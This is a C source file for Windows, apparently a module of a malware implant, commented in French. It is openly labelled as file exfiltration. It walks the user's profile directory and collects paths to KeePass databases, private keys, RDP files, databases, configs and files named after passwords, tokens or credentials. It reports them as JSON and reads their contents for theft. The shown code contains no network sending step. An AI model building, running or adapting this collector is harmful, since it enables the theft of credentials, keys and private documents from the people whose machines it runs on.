/*
 * exfil.c - File Exfiltration
 *
 * Recherche et exfiltration de fichiers sensibles.
 * - Recherche par extension (.docx, .pdf, .kdbx, .key, etc.)
 * - Recherche par mot-clé (password, secret, credentials)
 * - Compression avant envoi (optionnel)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

/* ============================================================================
 * Configuration
 * ============================================================================ */

// Extensions sensibles par défaut
static const char* SENSITIVE_EXTENSIONS[] = {
    ".docx", ".doc", ".xlsx", ".xls", ".pdf",
    ".kdbx", ".kdb",              // KeePass
    ".key", ".pem", ".ppk",       // Clés SSH/SSL
    ".rdp",                       // Connexions RDP
    ".sql", ".db", ".sqlite",     // Bases de données
    ".conf", ".config", ".ini",   // Fichiers de config
    ".txt", ".log",               // Fichiers texte
    NULL
};

// Mots-clés sensibles
static const char* SENSITIVE_KEYWORDS[] = {
    "password", "passwd", "secret", "credential",
    "private", "confidential", "bank", "account",
    "login", "token", "api_key", "apikey",
    NULL
};

// Taille max pour recherche dans contenu
#define MAX_CONTENT_SEARCH_SIZE (10 * 1024 * 1024)  // 10 MB

/* ============================================================================
 * Utilitaires
 * ============================================================================ */

/* Vérifie si un fichier a une extension sensible */
static BOOL HasSensitiveExtension(const char* filename) {
    const char* ext = PathFindExtensionA(filename);
    if (!ext || !*ext) return FALSE;

    for (int i = 0; SENSITIVE_EXTENSIONS[i]; i++) {
        if (_stricmp(ext, SENSITIVE_EXTENSIONS[i]) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

/* Vérifie si le nom de fichier contient un mot-clé sensible */
static BOOL ContainsSensitiveKeyword(const char* filename) {
    char lower[MAX_PATH];
    strncpy(lower, filename, sizeof(lower) - 1);
    lower[sizeof(lower) - 1] = '\0';
    
    // Convertit en minuscules
    for (char* p = lower; *p; p++) {
        *p = (char)tolower((unsigned char)*p);
    }

    for (int i = 0; SENSITIVE_KEYWORDS[i]; i++) {
        if (strstr(lower, SENSITIVE_KEYWORDS[i])) {
            return TRUE;
        }
    }
    return FALSE;
}

/* ============================================================================
 * Recherche de fichiers
 * ============================================================================ */

typedef struct {
    char** files;
    int count;
    int capacity;
    DWORD64 totalSize;
} FileList;

static void FileList_Init(FileList* list) {
    list->files = NULL;
    list->count = 0;
    list->capacity = 0;
    list->totalSize = 0;
}

static BOOL FileList_Add(FileList* list, const char* path, DWORD fileSize) {
    if (list->count >= list->capacity) {
        int newCap = list->capacity == 0 ? 64 : list->capacity * 2;
        char** newFiles = (char**)realloc(list->files, newCap * sizeof(char*));
        if (!newFiles) return FALSE;
        list->files = newFiles;
        list->capacity = newCap;
    }

    list->files[list->count] = _strdup(path);
    if (!list->files[list->count]) return FALSE;
    
    list->count++;
    list->totalSize += fileSize;
    return TRUE;
}

static void FileList_Free(FileList* list) {
    for (int i = 0; i < list->count; i++) {
        free(list->files[i]);
    }
    free(list->files);
    FileList_Init(list);
}

/* Recherche récursive de fichiers */
static void SearchDirectory(const char* basePath, FileList* list, 
                            BOOL byExtension, BOOL byKeyword, int maxDepth) {
    if (maxDepth <= 0) return;

    char searchPath[MAX_PATH];
    snprintf(searchPath, sizeof(searchPath), "%s\\*", basePath);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        // Skip . et ..
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) {
            continue;
        }

        char fullPath[MAX_PATH];
        snprintf(fullPath, sizeof(fullPath), "%s\\%s", basePath, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Récursion dans les sous-répertoires
            SearchDirectory(fullPath, list, byExtension, byKeyword, maxDepth - 1);
        } else {
            // Vérifie si le fichier est intéressant
            BOOL match = FALSE;
            
            if (byExtension && HasSensitiveExtension(fd.cFileName)) {
                match = TRUE;
            }
            if (byKeyword && ContainsSensitiveKeyword(fd.cFileName)) {
                match = TRUE;
            }

            if (match) {
                FileList_Add(list, fullPath, fd.nFileSizeLow);
            }
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}

/* ============================================================================
 * API Publique
 * ============================================================================ */

/*
 * Recherche des fichiers sensibles dans un répertoire.
 * Retourne un JSON avec la liste des fichiers trouvés.
 */
BOOL Exfil_SearchFiles(const char* startPath, BOOL byExtension, BOOL byKeyword, 
                       int maxDepth, char** outJson) {
    if (!outJson) return FALSE;
    *outJson = NULL;

    FileList list;
    FileList_Init(&list);

    // Utilise le répertoire utilisateur par défaut si non spécifié
    char searchRoot[MAX_PATH];
    if (!startPath || !*startPath) {
        char* userProfile = getenv("USERPROFILE");
        if (userProfile) {
            strncpy(searchRoot, userProfile, sizeof(searchRoot) - 1);
        } else {
            strcpy(searchRoot, "C:\\Users");
        }
    } else {
        strncpy(searchRoot, startPath, sizeof(searchRoot) - 1);
    }
    searchRoot[sizeof(searchRoot) - 1] = '\0';

    // Recherche
    SearchDirectory(searchRoot, &list, byExtension, byKeyword, maxDepth > 0 ? maxDepth : 5);

    // Construit le JSON
    size_t jsonSize = 1024 + (list.count * (MAX_PATH + 50));
    char* json = (char*)malloc(jsonSize);
    if (!json) {
        FileList_Free(&list);
        return FALSE;
    }

    int offset = snprintf(json, jsonSize,
        "{\n"
        "  \"search_root\": \"%s\",\n"
        "  \"by_extension\": %s,\n"
        "  \"by_keyword\": %s,\n"
        "  \"files_found\": %d,\n"
        "  \"total_size_bytes\": %llu,\n"
        "  \"files\": [\n",
        searchRoot,
        byExtension ? "true" : "false",
        byKeyword ? "true" : "false",
        list.count,
        (unsigned long long)list.totalSize);

    for (int i = 0; i < list.count && offset < (int)jsonSize - 100; i++) {
        // Échappe les backslashes pour JSON
        char escaped[MAX_PATH * 2];
        int j = 0;
        for (const char* p = list.files[i]; *p && j < sizeof(escaped) - 2; p++) {
            if (*p == '\\') {
                escaped[j++] = '\\';
                escaped[j++] = '\\';
            } else {
                escaped[j++] = *p;
            }
        }
        escaped[j] = '\0';

        offset += snprintf(json + offset, jsonSize - offset,
            "    \"%s\"%s\n",
            escaped,
            i < list.count - 1 ? "," : "");
    }

    snprintf(json + offset, jsonSize - offset, "  ]\n}");

    FileList_Free(&list);
    *outJson = json;
    return TRUE;
}

/*
 * Lit un fichier et retourne son contenu.
 * Pour l'exfiltration réelle.
 */
BOOL Exfil_ReadFile(const char* filePath, BYTE** outData, DWORD* outSize) {
    if (!filePath || !outData || !outSize) return FALSE;
    *outData = NULL;
    *outSize = 0;

    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, 
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hFile);
        return FALSE;
    }

    // Limite de taille pour éviter les fichiers énormes
    if (fileSize > MAX_CONTENT_SEARCH_SIZE) {
        CloseHandle(hFile);
        return FALSE;
    }

    *outData = (BYTE*)malloc(fileSize);
    if (!*outData) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, *outData, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        free(*outData);
        *outData = NULL;
        CloseHandle(hFile);
        return FALSE;
    }

    *outSize = fileSize;
    CloseHandle(hFile);
    return TRUE;
}
